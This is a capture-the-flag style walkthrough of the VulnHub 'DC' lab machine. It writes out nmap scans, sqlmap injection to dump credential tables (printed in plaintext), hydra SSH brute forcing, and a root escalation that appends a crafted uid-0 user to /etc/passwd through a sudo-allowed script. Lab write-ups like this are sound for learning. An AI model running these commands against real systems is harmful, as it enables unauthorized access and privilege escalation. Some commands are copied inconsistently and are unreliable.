# VulnHub Walkthrough: DC

DC Walkthrough

### Details
* Name: DC ([VulnHub](https://www.vulnhub.com/entry/dc-1,292/))
* Goal: Get root and read the only flag

### Initial Network Scan
```bash
sudo netdiscover
```
From the network scan we find that the target IP is `192.168.1.10`.


### Network Scan
Now we lok into doing a more indepth scan of the target machine to locate any open ports.

```bash
# Scan ports 0-65535
nmap -A -p0-65535 192.168.1.10
```

From here, because I saw that port 80 was open, I decided to run a more in-depth nmap scan to enumerate HTTP.

```bash
# Scan all ports, enumerate HTTP, etc.
sudo nmap -sC -sV -A -O -p- -T4 -script http-enum 192.168.1.10
```

This nmap then discovered another open port, 22, which is SSH (filtered).
With that in mind, I decided to try and run a brute force script via nmap on the SSH port to see if I could get in.
```bash
nmap -A --script ssh-brute 192.168.1.10 -p 22
```
However, this return a "closed" state for SSH. So let's move onto exploring the HTTP port.

### HTTP directory enumeration

Before I start exploring the website, I want to run a gobuster, nikto, and dirb scan to see if there are any hidden directories.
```bash
# Gobuster scan: Big wordlist
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -e -t 20 -u http://192.168.1.10

# Nikto scan
nikto -h http://192.168.1.10

# dirb scan
dirb http://192.168.1.10
```

All 3 scans returned nothing that seemed of use, just the directories */includes/* & */css/*.

### Website Exploration

Once looking at the website, there were a couple of interesting things that I noticed.

1. The website seems to have the domain - example.com
     * I could maybe try to map the IP address to the domain and then run an nmap scan again to see if there are any other directories. 
2. On the */display.php* page, it seems like it is just dumping an entire database table.
     * I could try to use sqlmap to dump the database table.
3. There is a login page at `manage.php`
     * I could try to run a hydra scan to brute force the login page.


I first began by remapping the IP address to the domain name via the hosts file.
```bash
sudo vim /etc/hosts

## Add the following line
192.168.1.10 example.com
```

Next I ran the same nmap scan as above, but using the domain
```bash
nmap -A -p0-65535 example.com

sudo nmap -sC -sV -A -O -p- -T4 -script http-enum example.com
```

However, neither of these returned anything different so I decided to change the domain back to the IP address and move onto sqlmap.

### SQL

1. Burpsuite --> Proxy --> Intercept tab --> Open Browser and go to http://192.168.1.10/search.php
2. In the search bar, type `1'` (don't press enter yet)
3. In Burpsuite, turn on the intercept, THEN press enter in the search bar.
4. Save the output to a file called `search.txt`
5. Run sqlmap on the search.php page
```bash
sqlmap -r search.txt --dbs
```

CASH. This returned the following database names:
* *information_schema*
* *Staff*
* *users*

Let's first check out the *users* database.
```bash
# Check what tables are in the 'users' database
sqlmap -r search.txt -D users --tables

# Check what columns are in the 'UserDetails' table (from the 'users' database)
sqlmap -r search.txt -D users -T UserDetails --columns

# Display username + password from the 'UserDetails' table (from the 'users' database)
sqlmap -r search.txt -D users -T UserDetails -C username,password --dump
```

CASH CASH CASH, we got the credentials for ALL STAFF (i hope):

| username  | password      |
|-----------|---------------|
| marym     | 3kfs86sfd     |
| julied    | 468sfdfsd2    |
| fredf     | 4sfd87sfd1    |
| barneyr   | RocksOff      |
| tomc      | TC&TheBoyz    |
| jerrym    | B8m#48sd      |
| wilmaf    | Pebbles       |
| bettyr    | BamBam01      |
| chandlerb | UrAG0D!       |
| joeyt     | Passw0rd      |
| rachelg   | yN72#dsd      |
| rossg     | ILoveRachel   |
| monicag   | 3248dsds7s    |
| phoebeb   | smellycats    |
| scoots    | YR3BVxxxw87   |
| janitor   | Ilovepeepee   |
| janitor2  | Hawaii-Five-0 |

Before we do anything with these credentials, let's try to check out the Staff database.
```bash
# Check what tables are in the 'Staff' database
sqlmap -r search.txt -D users --tables

# Check what columns are in the 'StaffDetails' table (from the 'Staff' database)
sqlmap -r search.txt -D users -T UserDetails --columns

# Check what columns are in the 'Users' table (from the 'Staff' database)
sqlmap -r search.txt -D users -T UserDetails --columns

# Display Username + Password from the 'Users' table (from the 'Staff' database)
sqlmap -r search.txt -D users -T UserDetails -C username,password --dump
```

CASH AGAIN!!!! We got some more credentials, and sqlmap did us the favor and cracked the password:

| Username | Password      |
|----------|---------------|
| admin    | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |

This is great as it is the login for the website.


### Huh?

So this is where things got interesting. Once I got the login credentials for the website, I tried to login to the website and it worked as I assumed it would. However, there wasn't much too see, or atleast that I could find.
The only interesting thing that I found was within the 'Add Record' tab. On this tab, there was several fill in boxes.
On the last box, email, I tried doing an SQL injection test by simply typing `'` and pressing enter, which it then returned SQL errror regarding the SQL syntax.

From here I was stumped for a bit. I knew that the large list of credentials that I found either were login credentials for the SQL database or for SSH. However, earlier when I looked at the nmap scan, it said that SSH was closed (filtered). Then after I mapped the IP address to the domain *example.com*, and tried running an nmap scan on the domain, it again said that SSH was closed (filtered). This is why I reverted the domain back to the IP address.

However, out of curiousity I tried changing the IP address to map to the domain *example.com* once again, and boom it finally said that SSH was open. Confusing.
What makes it even more confusing, is that I tried undo-ing the mapping of the IP address to the domain, and then running the nmap scan on the domain, and it said that SSH was still open?

### SSH

Anyways, with the SSH port now out of the blue working now, I then decided to use the list of usernames and passwords to try and brute force the SSH login.
```bash
# These credentials seemed to work!
ssh chandlerb@example.com -p 22
ssh joeyt@example.com -p 22
ssh janitor@example.com -p 22
```

### Privilege Escalation

I first logged in as *chandlerb* and briefly looked around his home directory. I didn't see anything of interest, so I then tried a different user.

I then logged in as *janitor*, which immediately I was able to find something interesting.
In the *janitor* home directory, there was a hidden directory titled *.secrets-for-putin/*.
Inside of this directory, I found a file called *passwords-found-on-post-it-notes.txt* with the following contents:
```txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

Some of the passwords in that file belong to users we already have credentials for. So we now need to figure out to whom the other passwords belong to.

Below is an updated list of the *working* credentials that I have found so far:

| Username  | Password      |
|-----------|---------------|
| fredf     | B4-Tru3-001     |
| chandlerb | UrAG0D!         |
| joeyt     | Passw0rd        |
| janitor   | Ilovepeepee     |

Also an automated way of doing all of this is storing all of the usernames on seperate lines in a file called *usernames.txt*, then all of the passwords on seperate lines in a file called *passwords.txt*.
Then run the following command:
```bash
# Method 1
hydra -L useranmes.txt -P passwords.txt ssh://192.168.1.10 -t 6

# Method 2
hydra -L useranmes.txt -P passwords.txt -u 192.168.1.10 ssh -t 6
```

I decided to stick with user *fredf* and then ran the following command to find all the files on the machine that had the SUID bit set:
```bash
# Method 1
find / -perm -u=s -type f 2>/dev/null

# Method 2
find / -perm -4000 -type f -ls 2>/dev/null
```

## Meh

So running the following command logged in as fredf we got something interesting:
```bash
sudo -l
```

This returned information that the user *fredf* could run the following command as root:
```bash
(root) NOPASSWD: /opt/devstuff/dist/test/test
```

So then I did some investigating in the */opt/devstuff* directory and found the test.py file.
```python
#!/usr/bin/python

import sys

if len(sys.argv) != 3:
     print("Usage: python test.py read append")
     sys.exit(1)

else:
     f = open(sys.argv[1], 'r')
     output = (f.read())

     f = open(sys.argv[2], 'a')
     f.write(output)
     f.close()
```


Essentially this python file has the ability to read a file and then append the contents of that file to another file.

So what we'll do is generate a new SSH key pair, and add it to a file called user

```bash
openssl passwd -1 -salt narco apass12345
```

This command outputs the following:
```txt
$1$narco$.Tc6tZK6QGD.6mdvtw5If/
```

```bash
echo "narco:$1$narco$.Tc6tZK6QGD.6mdvtw5If/:0:0::/root:/bin/bash" > slab

# Run the test.py file
sudo /opt/devstuff/dist/test/test /tmp/slab /etc/passwd

# Then verify that the user was added
cat /etc/passwd
```



## Stuff to look into
* Port knocking
